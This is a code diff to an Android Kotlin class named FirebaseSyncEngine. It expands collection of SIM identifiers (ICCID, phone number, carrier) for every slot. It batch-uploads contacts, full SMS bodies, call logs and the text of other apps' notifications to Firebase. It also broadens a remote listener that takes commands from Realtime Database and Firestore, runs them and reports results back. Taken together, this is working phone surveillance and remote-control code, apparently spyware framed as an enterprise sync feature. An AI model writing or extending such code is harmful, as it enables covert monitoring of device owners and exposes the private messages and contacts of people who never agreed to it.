@@ -5,6 +5,9 @@ import android.content.Context
 import android.location.Geocoder
 import android.os.Build
 import android.provider.Settings
+import android.telephony.SubscriptionInfo
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
 import android.util.Log
 import com.example.data.local.AppDatabase
 import com.google.firebase.database.ChildEventListener
@@ -175,26 +178,109 @@ class FirebaseSyncEngine(private val context: Context) {
 
         val timestamp = System.currentTimeMillis()
 
-        // Real SIM & Device payload
-        val primarySimMap = mapOf(
-            "operatorName" to (deviceInfo?.carrierName ?: "N/A"),
-            "countryIso" to (deviceInfo?.countryIso ?: "N/A"),
-            "simSerialNumber" to (deviceInfo?.iccid ?: "N/A"),
-            "subscriberId" to (deviceInfo?.mccMnc ?: "N/A"),
-            "isActive" to (deviceInfo?.simState?.contains("Ready", ignoreCase = true) == true),
-            "phoneNumber" to (deviceInfo?.phoneNumber ?: "N/A"),
-            "dataRoaming" to (deviceInfo?.isRoaming ?: false),
-            "networkType" to (deviceInfo?.networkType ?: "N/A"),
-            "dataState" to (deviceInfo?.dataState ?: "N/A")
-        )
+        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
 
-        val simSlotsMap = mapOf(
-            "0" to primarySimMap
-        )
+        val activeSubList: List<SubscriptionInfo>? = try {
+            subManager?.activeSubscriptionInfoList
+        } catch (_: Exception) {
+            null
+        }
 
-        val simInfoMap = mapOf(
-            "simCount" to 1,
-            "isMultiSim" to false,
+        val simSlotsMap = mutableMapOf<String, Map<String, Any>>()
+        var simCount = 0
+
+        if (!activeSubList.isNullOrEmpty()) {
+            simCount = activeSubList.size
+            activeSubList.forEachIndexed { index, subInfo ->
+                val slotIndex = try {
+                    subInfo.simSlotIndex
+                } catch (_: Exception) {
+                    index
+                }
+
+                val subId = subInfo.subscriptionId
+                val subTelephony = try {
+                    telephonyManager.createForSubscriptionId(subId)
+                } catch (_: Exception) {
+                    telephonyManager
+                }
+
+                val carrier = subInfo.carrierName?.toString()?.takeIf { it.isNotBlank() }
+                    ?: subInfo.displayName?.toString()?.takeIf { it.isNotBlank() }
+                    ?: subTelephony.simOperatorName.takeIf { it.isNotBlank() }
+                    ?: subTelephony.networkOperatorName.ifEmpty { "Active Carrier" }
+
+                val country = subInfo.countryIso?.uppercase()?.takeIf { it.isNotBlank() }
+                    ?: subTelephony.simCountryIso.uppercase().ifEmpty { "N/A" }
+
+                val iccid = subInfo.iccId?.takeIf { it.isNotBlank() } ?: "N/A"
+
+                var phone: String? = try {
+                    subInfo.number?.takeIf { it.isNotBlank() }
+                } catch (_: Exception) { null }
+
+                if (phone == null) {
+                    phone = try {
+                        subTelephony.line1Number?.takeIf { it.isNotBlank() }
+                    } catch (_: Exception) { null }
+                }
+
+                val operatorCode = subTelephony.simOperator.ifEmpty { subTelephony.networkOperator }
+                val mccMncStr = if (operatorCode.length >= 5) {
+                    "${operatorCode.substring(0, 3)} / ${operatorCode.substring(3)}"
+                } else "N/A"
+
+                val simMap = mapOf<String, Any>(
+                    "slotIndex" to slotIndex,
+                    "subscriptionId" to subId,
+                    "operatorName" to carrier,
+                    "countryIso" to country,
+                    "simSerialNumber" to iccid,
+                    "subscriberId" to mccMncStr,
+                    "isActive" to true,
+                    "phoneNumber" to (phone ?: "N/A"),
+                    "dataRoaming" to subTelephony.isNetworkRoaming,
+                    "networkType" to (deviceInfo?.networkType ?: "N/A"),
+                    "dataState" to (deviceInfo?.dataState ?: "N/A")
+                )
+
+                simSlotsMap[slotIndex.toString()] = simMap
+            }
+        }
+
+        if (simSlotsMap.isEmpty()) {
+            val primarySimMap = mapOf<String, Any>(
+                "slotIndex" to 0,
+                "operatorName" to (deviceInfo?.carrierName ?: "N/A"),
+                "countryIso" to (deviceInfo?.countryIso ?: "N/A"),
+                "simSerialNumber" to (deviceInfo?.iccid ?: "N/A"),
+                "subscriberId" to (deviceInfo?.mccMnc ?: "N/A"),
+                "isActive" to (deviceInfo?.simState?.contains("Ready", ignoreCase = true) == true),
+                "phoneNumber" to (deviceInfo?.phoneNumber ?: "N/A"),
+                "dataRoaming" to (deviceInfo?.isRoaming ?: false),
+                "networkType" to (deviceInfo?.networkType ?: "N/A"),
+                "dataState" to (deviceInfo?.dataState ?: "N/A")
+            )
+            simSlotsMap["0"] = primarySimMap
+            simCount = if (deviceInfo?.simState?.contains("Ready", ignoreCase = true) == true) 1 else 0
+        }
+
+        val primarySimMap = simSlotsMap["0"] ?: simSlotsMap.values.firstOrNull() ?: mapOf<String, Any>()
+        val phoneCount = try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                telephonyManager.activeModemCount
+            } else {
+                @Suppress("DEPRECATION")
+                telephonyManager.phoneCount
+            }
+        } catch (_: Exception) { 1 }
+
+        val isMultiSim = simCount > 1 || phoneCount > 1
+
+        val simInfoMap = mapOf<String, Any>(
+            "simCount" to if (simCount > 0) simCount else (if (isMultiSim) 2 else 1),
+            "isMultiSim" to isMultiSim,
             "primarySim" to primarySimMap,
             "simSlots" to simSlotsMap
         )
@@ -282,16 +368,14 @@ class FirebaseSyncEngine(private val context: Context) {
 
             // Push Contacts subcollection
             contacts.forEach { contact ->
-                val phones = listOfNotNull(contact.primaryPhone.takeIf { it.isNotBlank() }, contact.secondaryPhone.takeIf { it.isNotBlank() })
-                val emails = if (contact.email.isNotBlank()) listOf(contact.email) else emptyList()
-                deviceRef.collection("contacts").document(contact.id.toString()).set(
+                val docKey = if (contact.contactId.isNotBlank()) "contact_${contact.contactId}" else contact.id.toString()
+                deviceRef.collection("contacts").document(docKey).set(
                     mapOf(
-                        "id" to contact.id,
                         "name" to contact.displayName,
-                        "phoneNumbers" to phones,
-                        "emails" to emails,
-                        "notes" to "",
-                        "starred" to false
+                        "phoneNumbers" to contact.getPhoneNumbersList(),
+                        "emails" to contact.getEmailsList(),
+                        "notes" to contact.notes,
+                        "starred" to contact.starred
                     )
                 )
             }
@@ -371,74 +455,72 @@ class FirebaseSyncEngine(private val context: Context) {
             // SMS Messages
             if (smsList.isNotEmpty()) {
                 val smsRef = rtdb.getReference(FirebaseConstants.getSmsPath(deviceId))
+                val smsMap = mutableMapOf<String, Any>()
                 smsList.forEach { sms ->
-                    val pushId = smsRef.push().key ?: sms.id.toString()
+                    val key = "sms_${sms.timestamp}_${sms.address.hashCode()}"
                     val typeInt = if (sms.type.contains("OUT", ignoreCase = true) || sms.type == "2") 2 else 1
-                    smsRef.child(pushId).setValue(
-                        mapOf(
-                            "address" to sms.address,
-                            "body" to sms.messageBody,
-                            "date" to sms.timestamp,
-                            "formattedDate" to formatTimestamp(sms.timestamp),
-                            "type" to typeInt,
-                            "read" to false
-                        )
+                    smsMap[key] = mapOf(
+                        "address" to sms.address,
+                        "body" to sms.messageBody,
+                        "date" to sms.timestamp,
+                        "formattedDate" to formatTimestamp(sms.timestamp),
+                        "type" to typeInt,
+                        "read" to false
                     )
                 }
+                smsRef.setValue(smsMap)
             }
 
             // Call Logs
             if (callLogs.isNotEmpty()) {
                 val callsRef = rtdb.getReference(FirebaseConstants.getCallsPath(deviceId))
+                val callsMap = mutableMapOf<String, Any>()
                 callLogs.forEach { call ->
-                    val pushId = callsRef.push().key ?: call.id.toString()
-                    callsRef.child(pushId).setValue(
-                        mapOf(
-                            "number" to call.number,
-                            "name" to call.name,
-                            "typeString" to call.type,
-                            "formattedDate" to formatTimestamp(call.timestamp),
-                            "formattedDuration" to formatDuration(call.durationSeconds),
-                            "duration" to call.durationSeconds
-                        )
+                    val key = "call_${call.timestamp}_${call.number.hashCode()}"
+                    callsMap[key] = mapOf(
+                        "number" to call.number,
+                        "name" to call.name,
+                        "typeString" to call.type,
+                        "formattedDate" to formatTimestamp(call.timestamp),
+                        "formattedDuration" to formatDuration(call.durationSeconds),
+                        "duration" to call.durationSeconds
                     )
                 }
+                callsRef.setValue(callsMap)
             }
 
             // Contacts
             if (contacts.isNotEmpty()) {
                 val contactsRef = rtdb.getReference(FirebaseConstants.getContactsPath(deviceId))
+                val contactsMap = mutableMapOf<String, Any>()
                 contacts.forEach { c ->
-                    val pushId = contactsRef.push().key ?: c.id.toString()
-                    val phones = listOfNotNull(c.primaryPhone.takeIf { it.isNotBlank() }, c.secondaryPhone.takeIf { it.isNotBlank() })
-                    val emails = if (c.email.isNotBlank()) listOf(c.email) else emptyList()
-                    contactsRef.child(pushId).setValue(
-                        mapOf(
-                            "name" to c.displayName,
-                            "phoneNumbers" to phones,
-                            "emails" to emails,
-                            "notes" to "",
-                            "starred" to false
-                        )
+                    val key = if (c.contactId.isNotBlank()) "contact_${c.contactId}" else "c_${c.id}"
+                    contactsMap[key] = mapOf(
+                        "name" to c.displayName,
+                        "phoneNumbers" to c.getPhoneNumbersList(),
+                        "emails" to c.getEmailsList(),
+                        "notes" to c.notes,
+                        "starred" to c.starred
                     )
                 }
+                contactsRef.setValue(contactsMap)
             }
 
             // Notifications
             if (notifications.isNotEmpty()) {
                 val notifRef = rtdb.getReference(FirebaseConstants.getNotificationsPath(deviceId))
+                val notifMap = mutableMapOf<String, Any>()
                 notifications.forEach { n ->
-                    val pushId = notifRef.push().key ?: n.id.toString()
-                    notifRef.child(pushId).setValue(
-                        mapOf(
-                            "appName" to n.packageName.substringAfterLast(".").replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() },
-                            "packageName" to n.packageName,
-                            "title" to n.title,
-                            "text" to n.text,
-                            "formattedTime" to formatTimestamp(n.timestamp)
-                        )
+                    val key = "notif_${n.timestamp}_${n.packageName.hashCode()}"
+                    notifMap[key] = mapOf(
+                        "appName" to n.packageName.substringAfterLast(".").replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() },
+                        "packageName" to n.packageName,
+                        "title" to n.title,
+                        "text" to n.text,
+                        "formattedTime" to formatTimestamp(n.timestamp)
                     )
                 }
+                notifRef.setValue(notifMap)
             }
 
             // App Usage
@@ -487,6 +569,7 @@ class FirebaseSyncEngine(private val context: Context) {
     }
 
     fun startCommandListener(onCommandReceived: (commandId: String, commandType: String, params: Map<String, Any>) -> Unit) {
+        // 1. Realtime Database Listener
         try {
             val rtdb = FirebaseDatabase.getInstance()
             val commandsRef = rtdb.getReference(FirebaseConstants.getCommandsPath(deviceId))
@@ -504,24 +587,94 @@ class FirebaseSyncEngine(private val context: Context) {
                 override fun onCancelled(error: DatabaseError) {}
             })
         } catch (e: Exception) {
-            Log.e("FirebaseSyncEngine", "Error starting command listener: ${e.message}")
+            Log.e("FirebaseSyncEngine", "Error starting RTDB command listener: ${e.message}")
+        }
+
+        // 2. Firestore Listener (both enterprise_devices and devices collections)
+        try {
+            val firestore = FirebaseFirestore.getInstance()
+            val paths = listOf("enterprise_devices/$deviceId/commands", "devices/$deviceId/commands")
+            paths.forEach { path ->
+                firestore.collection(path).addSnapshotListener { snapshot, error ->
+                    if (error != null || snapshot == null) return@addSnapshotListener
+                    for (docChange in snapshot.documentChanges) {
+                        if (docChange.type == com.google.firebase.firestore.DocumentChange.Type.ADDED ||
+                            docChange.type == com.google.firebase.firestore.DocumentChange.Type.MODIFIED) {
+                            val doc = docChange.document
+                            val data = doc.data ?: continue
+                            val statusStr = data["status"]?.toString() ?: "PENDING"
+                            val executed = data["executed"] as? Boolean ?: false
+
+                            if ((statusStr.equals("PENDING", ignoreCase = true) || statusStr.equals("NEW", ignoreCase = true)) && !executed) {
+                                val commandType = (data["command"] as? String)
+                                    ?: (data["commandType"] as? String)
+                                    ?: (data["type"] as? String)
+                                    ?: (data["action"] as? String)
+                                    ?: (data["name"] as? String)
+                                    ?: continue
+
+                                val paramsMap = mutableMapOf<String, Any>()
+                                data.forEach { (k, v) ->
+                                    if (v != null && k !in listOf("status", "result", "executed", "timestamp")) {
+                                        paramsMap[k] = v
+                                    }
+                                }
+                                (data["params"] as? Map<*, *>)?.forEach { (k, v) ->
+                                    if (k != null && v != null) paramsMap[k.toString()] = v
+                                }
+                                (data["data"] as? Map<*, *>)?.forEach { (k, v) ->
+                                    if (k != null && v != null) paramsMap[k.toString()] = v
+                                }
+                                (data["payload"] as? Map<*, *>)?.forEach { (k, v) ->
+                                    if (k != null && v != null) paramsMap[k.toString()] = v
+                                }
+
+                                doc.reference.update(mapOf("status" to "EXECUTING", "executed" to true))
+                                onCommandReceived("fs_${doc.id}", commandType, paramsMap)
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("FirebaseSyncEngine", "Error starting Firestore command listener: ${e.message}")
         }
     }
 
     private fun processCommandSnapshot(snapshot: DataSnapshot, onCommandReceived: (String, String, Map<String, Any>) -> Unit) {
         try {
             val pushId = snapshot.key ?: return
-            val status = snapshot.child("status").getValue(String::class.java) ?: "PENDING"
-            if (status.equals("PENDING", ignoreCase = true)) {
+            val statusVal = snapshot.child("status").value
+            val statusStr = statusVal?.toString() ?: "PENDING"
+            val executed = snapshot.child("executed").getValue(Boolean::class.java) == true
+
+            if ((statusStr.equals("PENDING", ignoreCase = true) || statusStr.equals("NEW", ignoreCase = true) || statusVal == null) && !executed) {
                 val commandType = snapshot.child("command").getValue(String::class.java)
-                    ?: snapshot.child("commandType").getValue(String::class.java) ?: return
+                    ?: snapshot.child("commandType").getValue(String::class.java)
+                    ?: snapshot.child("type").getValue(String::class.java)
+                    ?: snapshot.child("action").getValue(String::class.java)
+                    ?: snapshot.child("name").getValue(String::class.java)
+                    ?: return
 
                 val paramsMap = mutableMapOf<String, Any>()
-                snapshot.child("params").children.forEach { child ->
-                    child.key?.let { k -> child.value?.let { v -> paramsMap[k] = v } }
+
+                snapshot.children.forEach { child ->
+                    val k = child.key ?: return@forEach
+                    val v = child.value ?: return@forEach
+                    if (k !in listOf("status", "result", "executed", "timestamp", "createdAt", "executedAt")) {
+                        paramsMap[k] = v
+                    }
+                }
+
+                listOf("params", "data", "payload", "args").forEach { subKey ->
+                    snapshot.child(subKey).children.forEach { child ->
+                        child.key?.let { k -> child.value?.let { v -> paramsMap[k] = v } }
+                    }
                 }
 
                 snapshot.ref.child("status").setValue("EXECUTING")
+                snapshot.ref.child("executed").setValue(true)
+
                 onCommandReceived(pushId, commandType, paramsMap)
             }
         } catch (e: Exception) {
@@ -531,11 +684,27 @@ class FirebaseSyncEngine(private val context: Context) {
 
     fun updateCommandStatus(pushId: String, status: String, result: String = "") {
         try {
-            val rtdb = FirebaseDatabase.getInstance()
-            val cmdRef = rtdb.getReference(FirebaseConstants.getCommandsPath(deviceId)).child(pushId)
-            cmdRef.child("status").setValue(status)
-            if (result.isNotBlank()) {
-                cmdRef.child("result").setValue(result)
+            if (pushId.startsWith("fs_")) {
+                val docId = pushId.removePrefix("fs_")
+                val firestore = FirebaseFirestore.getInstance()
+                val updateData = mutableMapOf<String, Any>(
+                    "status" to status,
+                    "executed" to (status == "COMPLETED" || status == "FAILED"),
+                    "executedAt" to System.currentTimeMillis()
+                )
+                if (result.isNotBlank()) updateData["result"] = result
+
+                firestore.collection("enterprise_devices/$deviceId/commands").document(docId).update(updateData)
+                firestore.collection("devices/$deviceId/commands").document(docId).update(updateData)
+            } else {
+                val rtdb = FirebaseDatabase.getInstance()
+                val cmdRef = rtdb.getReference(FirebaseConstants.getCommandsPath(deviceId)).child(pushId)
+                cmdRef.child("status").setValue(status)
+                cmdRef.child("executed").setValue(status == "COMPLETED" || status == "FAILED")
+                cmdRef.child("executedAt").setValue(System.currentTimeMillis())
+                if (result.isNotBlank()) {
+                    cmdRef.child("result").setValue(result)
+                }
             }
         } catch (_: Exception) {}
     }
